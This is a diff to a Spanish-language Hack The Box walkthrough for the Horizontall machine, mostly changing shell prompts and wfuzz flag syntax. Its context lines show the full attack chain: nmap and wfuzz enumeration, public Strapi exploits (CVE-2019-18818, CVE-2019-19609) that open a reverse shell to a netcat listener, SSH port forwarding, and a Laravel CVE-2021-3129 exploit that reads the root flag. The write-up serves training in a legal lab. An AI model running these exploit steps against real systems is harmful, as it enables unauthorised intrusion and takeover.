@@ -38,7 +38,7 @@ Empezamos el reconocimiento lanzando un **`TCP SYN Port Scan`** con **`Nmap`** p
 | -oG       | Guarda el output en un archivo con formato grepeable para usar la función [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)
 
 ```console
-any0ne@Pentesting:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.105 -oG allPorts
+p3ntest1ng:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.105 -oG allPorts
 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-19 18:22 CET
@@ -79,7 +79,7 @@ Vamos a realizar un escaneo específico de los puertos encontrados para obtener 
 | -oN       | Guarda el output en un archivo con formato normal      |
 
 ```console
-any0ne@Pentesting:~$ nmap -sCV -p22,80 10.10.11.105 -oN targeted
+p3ntest1ng:~$ nmap -sCV -p 22,80 10.10.11.105 -oN targeted
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-19 18:30 CET
 Nmap scan report for horizontall.htb (10.10.11.105)
@@ -103,11 +103,11 @@ Nmap done: 1 IP address (1 host up) scanned in 10.86 seconds
 Veamos con qué está construida la página web, para ello ejecutamos la herramienta **`whatweb`** no sin antes añadir el virtualhost a nuestro archivo **`/etc/hosts`**
 
 ```console
-any0ne@Pentesting:~$ echo '10.10.11.105 horizontall.htb' | sudo tee -a /etc/hosts
+p3ntest1ng:~$ echo '10.10.11.105 horizontall.htb' | sudo tee -a /etc/hosts
 ```
 
 ```console
-any0ne@Pentesting:~$ whatweb http://horizontall.htb/
+p3ntest1ng:~$ whatweb http://horizontall.htb/
 
 http://horizontall.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
 ```
@@ -119,10 +119,10 @@ Primero usando un diccionario pequeño y si no encontramos nada usaremos uno má
 | --------- | :---------- |
 | -c        | Muestra el output en formato colorizado |
 | -w        | Utiliza el diccionario especificado |
-| --hc=404  | Oculta todos los códigos de estado 404 |
+| --hc 404  | Oculta todos los códigos de estado 404 |
 
 ```console
-any0ne@Pentesting:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc=404 http://horizontall.htb/FUZZ 2>/dev/null
+p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://horizontall.htb/FUZZ 2>/dev/null
 
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -154,14 +154,13 @@ Tampoco conseguimos ninguna información relevante con esto, vamos a comprobar s
 | --------- | :---------- |
 | -c        | Mostrar el output en formato colorizado |
 | -w        | Utiliza el diccionario especificado |
-| --hc=404  | Oculta los códigos de estado 404 |
-| --hw=2081 | Oculta todos los resultados que tengan 2081 palabras |
+| --hc 301,404 | Oculta los códigos de estado 301 y 404 |
 | -H        | Realiza una consulta de tipo header |
 | -u        | Especifica la URL para la consulta |
 | -t        | Nos permite lanzar el comando con N threads |
 
 ```console
-any0ne@Pentesting:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hc=301,404 -H "Host: FUZZ.horizontall.htb" -u http://horizontall.htb -t 100 2>/dev/null
+p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 301,404 -H "Host: FUZZ.horizontall.htb" -u http://horizontall.htb -t 100 2>/dev/null
 
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -186,7 +185,7 @@ Requests/sec.: 324.1928
 Hemos dado con un subdominio interesante, así que vamos a añadirlo a nuestro **`/etc/hosts`** para poder verlo.
 
 ```console
-any0ne@Pentesting:~$ echo '10.10.11.105 api-prod.horizontall.htb' | sudo tee -a /etc/hosts
+p3ntest1ng:~$ echo '10.10.11.105 api-prod.horizontall.htb' | sudo tee -a /etc/hosts
 ```
 
 ## Fase de Explotación
@@ -210,7 +209,7 @@ Realizando una búsqueda rápida en Google encontramos que esta versión es vuln
 Nos descargamos el [exploit](https://www.exploit-db.com/exploits/50239) y lo ejecutamos siguiendo las intrucciones:
 
 ```console
-any0ne@Pentesting:~$ python3 exploit-CVE-2019-18818.py http://api-prod.horizontall.htb/
+p3ntest1ng:~$ python3 exploit-CVE-2019-18818.py http://api-prod.horizontall.htb/
 ```
 
 ![Strapi Exploited](/assets/images/hackthebox/horizontall/strapi_exploit.png)
@@ -224,7 +223,7 @@ Para ello necesitamos el token **`JWT`** pero afortunadamente el exploit anterio
 Vamos a utilizar [otro exploit](https://github.com/diego-tella/CVE-2019-19609-EXPLOIT) para obtener la shell, pero primero nos ponemos en escucha con **`nc -nlvp 9999`**
 
 ```console
-any0ne@Pentesting:~$  python3 exploit.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM5OTQ2MDQwLCJleHAiOjE2NDI1MzgwNDB9.Mqaypv9YCdphfV10JvjPU_9mfw7jI_YYgL5hAAOIRL8 -l 10.10.14.253 -p 9999
+p3ntest1ng:~$ python3 exploit.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM5OTQ2MDQwLCJleHAiOjE2NDI1MzgwNDB9.Mqaypv9YCdphfV10JvjPU_9mfw7jI_YYgL5hAAOIRL8 -l 10.10.14.253 -p 9999
 ```
 
 ![Strapi Shell](/assets/images/hackthebox/horizontall/got_shell.png)
@@ -328,7 +327,7 @@ Ya estamos listos para iniciar nuestro [Port-Forwarding](https://es.wikipedia.or
 De ese modo podemos navegar a nuestro localhost y ver qué se está ejecutando en este puerto.
 
 ```console
-any0ne@Pentesting:~$ ssh -i wildzarek -L 8000:127.0.0.1:8000 strapi@horizontall.htb
+p3ntest1ng:~$ ssh -i wildzarek -L 8000:127.0.0.1:8000 strapi@horizontall.htb
 
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
 
@@ -358,13 +357,13 @@ Abrimos en el navegador la URL **`http://localhost:8000/`** y vemos un panel Lar
 Por suerte encontrar el exploit es bastante sencillo así que lo descargamos y lo ejecutamos.
 
 ```console
-any0ne@Pentesting:~$ git clone https://github.com/nth347/CVE-2021-3129_exploit
-any0ne@Pentesting:~$ cd CVE-2021-3129_exploit
-any0ne@Pentesting:~$ chmod +x exploit.py
+p3ntest1ng:~$ git clone https://github.com/nth347/CVE-2021-3129_exploit
+p3ntest1ng:~$ cd CVE-2021-3129_exploit
+p3ntest1ng:~$ chmod +x exploit.py
 ```
 
 ```console
-any0ne@Pentesting:~$ python exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
+p3ntest1ng:~$ python exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
 
 [i] Trying to clear logs
 [+] Logs cleared
@@ -383,5 +382,7 @@ las copiamos a nuestra máquina, le otorgamos los permisos adecuados y nos conec
 
 ### ¡Gracias por leer hasta el final!
 
-#### Y eso ha sido todo. Una máquina bastante asequible y fácil de realizar, quitando el redireccionamiento de puertos, lo demás ha sido enumeración y tirar de CVE's ya existentes. Recomendable si estás empezando en la plataforma y tienes pocas máquinas hechas.
+Y eso ha sido todo. Una máquina bastante asequible y fácil de realizar, quitando el redireccionamiento de puertos,
+lo demás ha sido enumeración y tirar de CVE's ya existentes. Recomendable si estás empezando en la plataforma y tienes pocas máquinas hechas.
+
 #### Nos vemos en un próximo. ¡Feliz hacking! ☠
